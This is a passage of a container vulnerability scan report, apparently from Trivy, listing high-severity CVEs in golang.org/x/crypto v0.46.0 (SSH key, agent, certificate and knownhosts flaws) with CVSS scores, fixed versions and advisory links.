│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [34]: https://access.redhat.com/security/cve/CVE-2026-39830 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/2445356 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/2456333 
│     │      │                  ├ [37]: https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [38]: https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [39]: https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [40]: https://bugzilla.redhat.com/2480684 
│     │      │                  ├ [41]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [42]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [43]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [44]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [45]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [46]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [47]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [48]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [49]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [50]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [51]: https://errata.almalinux.org/9/ALSA-2026-29455.html 
│     │      │                  ├ [52]: https://errata.rockylinux.org/RLSA-2026:35833 
│     │      │                  ├ [53]: https://github.com/golang/crypto/commit/4e7a7384ecbc8d519f6f4c11b36fa9d
│     │      │                  │       761fc8946 
│     │      │                  ├ [54]: https://go.dev/cl/781640 
│     │      │                  ├ [55]: https://go.dev/cl/781664 
│     │      │                  ├ [56]: https://go.dev/issue/79564 
│     │      │                  ├ [57]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [58]: https://linux.oracle.com/cve/CVE-2026-39830.html 
│     │      │                  ├ [59]: https://linux.oracle.com/errata/ELSA-2026-37072.html 
│     │      │                  ├ [60]: https://nvd.nist.gov/vuln/detail/CVE-2026-39830 
│     │      │                  ├ [61]: https://pkg.go.dev/vuln/GO-2026-5017 
│     │      │                  ├ [62]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39830
│     │      │                  │       .json 
│     │      │                  ├ [63]: https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [64]: https://ubuntu.com/security/notices/USN-8447-2 
│     │      │                  ├ [65]: https://ubuntu.com/security/notices/USN-8447-3 
│     │      │                  ╰ [66]: https://www.cve.org/CVERecord?id=CVE-2026-39830 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.44Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:50.177Z 
│     ├ [14] ╭ VulnerabilityID : CVE-2026-39831 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5019 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39831 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:dba8c4085e24360f310703809b25b64fd9384ae89caaa5624d29d6748b2d38f9 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Security key bypass due to
│     │      │                   missing user presence check 
│     │      ├ Description     : The Verify() method for FIDO/U2F security key types
│     │      │                   (sk-ecdsa-sha2-nistp256@openssh.com, sk-ssh-ed25519@openssh.com) did not check
│     │      │                    the User Presence flag. Signatures generated without physical touch were
│     │      │                   accepted, allowing unattended use of a hardware security key. To restore the
│     │      │                   previous behavior, return a "no-touch-required" extension in
│     │      │                   Permissions.Extensions from PublicKeyCallback. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-862 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ redhat: 3 
│     │      │                  ╰ ubuntu: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-39831 
│     │      │                  ├ [1]: https://github.com/golang/crypto/commit/b61cf853a89d82cad68da5e12a6beca2
│     │      │                  │      116f8456 
│     │      │                  ├ [2]: https://go.dev/cl/781662 
│     │      │                  ├ [3]: https://go.dev/issue/79566 
│     │      │                  ├ [4]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-39831 
│     │      │                  ├ [6]: https://pkg.go.dev/vuln/GO-2026-5019 
│     │      │                  ├ [7]: https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [8]: https://ubuntu.com/security/notices/USN-8447-3 
│     │      │                  ╰ [9]: https://www.cve.org/CVERecord?id=CVE-2026-39831 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.553Z 
│     │      ╰ LastModifiedDate: 2026-07-23T16:10:00.137Z 
│     ├ [15] ╭ VulnerabilityID : CVE-2026-39832 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5006 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39832 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:f0c31eeef5e4235665e47d3c308da852d3524be901b5d41b9551539b17115b33 
│     │      ├ Title           : golang.org/x/crypto/ssh/agent: golang.org/x/crypto/ssh/agent: Security bypass
│     │      │                   due to improper handling of key restrictions 
│     │      ├ Description     : When adding a key to a remote agent constraint extensions such as
│     │      │                   restrict-destination-v00@openssh.com were not serialized in the request.
│     │      │                   Destination restrictions were silently stripped when forwarding keys, allowing
│     │      │                    unrestricted use of the key on the remote host. The client now serializes all
│     │      │                    constraint extensions. Additionally, the in-memory keyring returned by
│     │      │                   NewKeyring() now rejects keys with unsupported constraint extensions instead
│     │      │                   of silently ignoring them. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-502 
│     │      │                  ╰ [1]: CWE-281 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 8.7 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:35833 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:36199 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:37072 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:37271 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:37410 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:40972 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [25]: https://access.redhat.com/security/cve/CVE-2026-39832 
│     │      │                  ├ [26]: https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [27]: https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [28]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [29]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [30]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [31]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [32]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [33]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [34]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [35]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [36]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [37]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [38]: https://errata.almalinux.org/9/ALSA-2026-37410.html 
│     │      │                  ├ [39]: https://errata.rockylinux.org/RLSA-2026:35833 
│     │      │                  ├ [40]: https://github.com/golang/crypto/commit/e3d1254f1e7e60baa086142c46174bf
│     │      │                  │       6d8d0fe50 
│     │      │                  ├ [41]: https://go.dev/cl/778642 
│     │      │                  ├ [42]: https://go.dev/issue/79435 
│     │      │                  ├ [43]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [44]: https://linux.oracle.com/cve/CVE-2026-39832.html 
│     │      │                  ├ [45]: https://linux.oracle.com/errata/ELSA-2026-37410.html 
│     │      │                  ├ [46]: https://nvd.nist.gov/vuln/detail/CVE-2026-39832 
│     │      │                  ├ [47]: https://pkg.go.dev/vuln/GO-2026-5006 
│     │      │                  ├ [48]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39832
│     │      │                  │       .json 
│     │      │                  ├ [49]: https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ╰ [50]: https://www.cve.org/CVERecord?id=CVE-2026-39832 
│     │      ├ PublishedDate   : 2026-05-22T04:16:22.663Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:51.397Z 
│     ├ [16] ╭ VulnerabilityID : CVE-2026-39835 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5015 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39835 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0ae3d4d14a7a7b39d3f2e89d59e9b1926588751c4e930fc47626647570165828 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang: golang.org/x/crypto/ssh: Denial of Service
│     │      │                   via crafted SSH certificate 
│     │      ├ Description     : SSH servers which use CertChecker as a public key callback without setting
│     │      │                   IsUserAuthority or IsHostAuthority could be caused to panic by a client
│     │      │                   presenting a certificate. CertChecker now returns an error instead of
│     │      │                   panicking when these callbacks are nil. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-295 
│     │      │                  ╰ [1]: CWE-476 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 2 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                           ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:36199 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:36319 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36625 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:37072 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:37268 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:37271 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:37272 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:37286 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:37296 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:37410 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:38504 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:40969 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:40972 
│     │      │                  ├ [25]: https://access.redhat.com/errata/RHSA-2026:40974 
│     │      │                  ├ [26]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [27]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [28]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [29]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [30]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [31]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [32]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [33]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [34]: https://access.redhat.com/security/cve/CVE-2026-39835 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [37]: https://bugzilla.redhat.com/show_bug.cgi?id=2467822 
│     │      │                  ├ [38]: https://bugzilla.redhat.com/show_bug.cgi?id=2480680 
│     │      │                  ├ [39]: https://bugzilla.redhat.com/show_bug.cgi?id=2493620 
│     │      │                  ├ [40]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-33811 
│     │      │                  ├ [41]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39835 
│     │      │                  ├ [42]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-57231 
│     │      │                  ├ [43]: https://errata.almalinux.org/9/ALSA-2026-37410.html 
│     │      │                  ├ [44]: https://errata.rockylinux.org/RLSA-2026:38504 
│     │      │                  ├ [45]: https://go.dev/cl/781660 
│     │      │                  ├ [46]: https://go.dev/issue/79563 
│     │      │                  ├ [47]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [48]: https://linux.oracle.com/cve/CVE-2026-39835.html 
│     │      │                  ├ [49]: https://linux.oracle.com/errata/ELSA-2026-38504.html 
│     │      │                  ├ [50]: https://nvd.nist.gov/vuln/detail/CVE-2026-39835 
│     │      │                  ├ [51]: https://pkg.go.dev/vuln/GO-2026-5015 
│     │      │                  ├ [52]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-39835
│     │      │                  │       .json 
│     │      │                  ╰ [53]: https://www.cve.org/CVERecord?id=CVE-2026-39835 
│     │      ├ PublishedDate   : 2026-05-22T04:16:24.53Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:17:53.223Z 
│     ├ [17] ╭ VulnerabilityID : CVE-2026-42508 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5021 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-42508 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:1387a7e5eb52e9fd5ebd435c12239a28a8ba53610aa43260e3e7c70c6ba4b0c9 
│     │      ├ Title           : golang.org/x/crypto/ssh/knownhosts: golang:
│     │      │                   golang.org/x/crypto/ssh/knownhosts: Revocation bypass via unchecked
│     │      │                   SignatureKey 
│     │      ├ Description     : Previously, a revoked 'SignatureKey' belonging to a CA was not correctly
│     │      │                   checked for revocation. Now, both the 'key' and 'key.SignatureKey' are checked
│     │      │                    for @revoked. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ azure      : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ├ rocky      : 3 
│     │      │                  ╰ ubuntu     : 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 7.4 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:35833 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:37072 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:37123 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:40262 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:40945 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:41019 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:41031 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:41036 
│     │      │                  ├ [19]: https://access.redhat.com/errata/RHSA-2026:41064 
│     │      │                  ├ [20]: https://access.redhat.com/errata/RHSA-2026:41066 
│     │      │                  ├ [21]: https://access.redhat.com/errata/RHSA-2026:42146 
│     │      │                  ├ [22]: https://access.redhat.com/errata/RHSA-2026:42796 
│     │      │                  ├ [23]: https://access.redhat.com/errata/RHSA-2026:43052 
│     │      │                  ├ [24]: https://access.redhat.com/errata/RHSA-2026:43692 
│     │      │                  ├ [25]: https://access.redhat.com/security/cve/CVE-2026-42508 
│     │      │                  ├ [26]: https://bugzilla.redhat.com/2480680 
│     │      │                  ├ [27]: https://bugzilla.redhat.com/2480681 
│     │      │                  ├ [28]: https://bugzilla.redhat.com/2480685 
│     │      │                  ├ [29]: https://bugzilla.redhat.com/2480688 
│     │      │                  ├ [30]: https://bugzilla.redhat.com/2480757 
│     │      │                  ├ [31]: https://bugzilla.redhat.com/2480761 
│     │      │                  ├ [32]: https://bugzilla.redhat.com/2493620 
│     │      │                  ├ [33]: https://bugzilla.redhat.com/show_bug.cgi?id=2455470 
│     │      │                  ├ [34]: https://bugzilla.redhat.com/show_bug.cgi?id=2480681 
│     │      │                  ├ [35]: https://bugzilla.redhat.com/show_bug.cgi?id=2480684 
│     │      │                  ├ [36]: https://bugzilla.redhat.com/show_bug.cgi?id=2480685 
│     │      │                  ├ [37]: https://bugzilla.redhat.com/show_bug.cgi?id=2480688 
│     │      │                  ├ [38]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-34986 
│     │      │                  ├ [39]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39829 
│     │      │                  ├ [40]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39830 
│     │      │                  ├ [41]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-39832 
│     │      │                  ├ [42]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-42508 
│     │      │                  ├ [43]: https://errata.almalinux.org/9/ALSA-2026-37123.html 
│     │      │                  ├ [44]: https://errata.rockylinux.org/RLSA-2026:35833 
│     │      │                  ├ [45]: https://github.com/golang/crypto/commit/f717e29698a271c548239ed56bf5dd9
│     │      │                  │       516d6f7e8 
│     │      │                  ├ [46]: https://go.dev/cl/781220 
│     │      │                  ├ [47]: https://go.dev/issue/79568 
│     │      │                  ├ [48]: https://groups.google.com/g/golang-announce/c/a082jnz-LvI 
│     │      │                  ├ [49]: https://linux.oracle.com/cve/CVE-2026-42508.html 
│     │      │                  ├ [50]: https://linux.oracle.com/errata/ELSA-2026-37123.html 
│     │      │                  ├ [51]: https://nvd.nist.gov/vuln/detail/CVE-2026-42508 
│     │      │                  ├ [52]: https://pkg.go.dev/vuln/GO-2026-5021 
│     │      │                  ├ [53]: https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-42508
│     │      │                  │       .json 
│     │      │                  ├ [54]: https://ubuntu.com/security/notices/USN-8447-1 
│     │      │                  ├ [55]: https://ubuntu.com/security/notices/USN-8447-2 
│     │      │                  ╰ [56]: https://www.cve.org/CVERecord?id=CVE-2026-42508 
│     │      ├ PublishedDate   : 2026-05-22T04:16:25.44Z 
│     │      ╰ LastModifiedDate: 2026-07-27T13:18:04.887Z 
│     ├ [18] ╭ VulnerabilityID : CVE-2026-46595 
│     │      ├ VendorIDs        ─ [0]: GO-2026-5023 
│     │      ├ PkgID           : golang.org/x/crypto@v0.46.0 
│     │      ├ PkgName         : golang.org/x/crypto 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/golang.org/x/crypto@v0.46.0 
│     │      │                  ╰ UID : 21d8a1373272a6c 
│     │      ├ InstalledVersion: v0.46.0 
│     │      ├ FixedVersion    : 0.52.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:42eba42eb1a81e5596620500b84a1f8aa005a623274431b41b4358ddc7f17a7e 
│     │      │                  ╰ DiffID: sha256:276dd070507261040bccf490fe9d3f9cbf1ca33027a34f6ed6abfbb61f3e271a 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-46595 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:54016784cf7440707a2a2cf8608d4efe408b564edaa04d027acf0fbcf370c0bc 
│     │      ├ Title           : golang.org/x/crypto/ssh: golang.org/x/crypto/ssh: Authorization bypass due to
│     │      │                   skipped source-address validation 
│     │      ├ Description     : Previously, CVE-2024-45337 fixed an authorization bypass for misused ssh
│     │      │                   server configurations; if any other type of callback is passed other than
│     │      │                   public key, then the source-address validation would be skipped. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ╭ [0]: CWE-863 
│     │      │                  ╰ [1]: CWE-303 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ redhat: 3 
│     │      │                  ╰ ubuntu: 2 
│     │      ├ CVSS             ─ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L 
│     │      │                           ╰ V3Score : 7.1 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:23262 
│     │      │                  ├ [1] : https://access.redhat.com/errata/RHSA-2026:23264 
│     │      │                  ├ [2] : https://access.redhat.com/errata/RHSA-2026:26546 
│     │      │                  ├ [3] : https://access.redhat.com/errata/RHSA-2026:26547 
│     │      │                  ├ [4] : https://access.redhat.com/errata/RHSA-2026:30650 
│     │      │                  ├ [5] : https://access.redhat.com/errata/RHSA-2026:30651 
│     │      │                  ├ [6] : https://access.redhat.com/errata/RHSA-2026:33524 
│     │      │                  ├ [7] : https://access.redhat.com/errata/RHSA-2026:33531 
│     │      │                  ├ [8] : https://access.redhat.com/errata/RHSA-2026:36207 
│     │      │                  ├ [9] : https://access.redhat.com/errata/RHSA-2026:36648 
│     │      │                  ├ [10]: https://access.redhat.com/errata/RHSA-2026:36651 
│     │      │                  ├ [11]: https://access.redhat.com/errata/RHSA-2026:36796 
│     │      │                  ├ [12]: https://access.redhat.com/errata/RHSA-2026:36797 
│     │      │                  ├ [13]: https://access.redhat.com/errata/RHSA-2026:36808 
│     │      │                  ├ [14]: https://access.redhat.com/errata/RHSA-2026:36820 
│     │      │                  ├ [15]: https://access.redhat.com/errata/RHSA-2026:37275 
│     │      │                  ├ [16]: https://access.redhat.com/errata/RHSA-2026:37387 
│     │      │                  ├ [17]: https://access.redhat.com/errata/RHSA-2026:40118 
│     │      │                  ├ [18]: https://access.redhat.com/errata/RHSA-2026:40945 
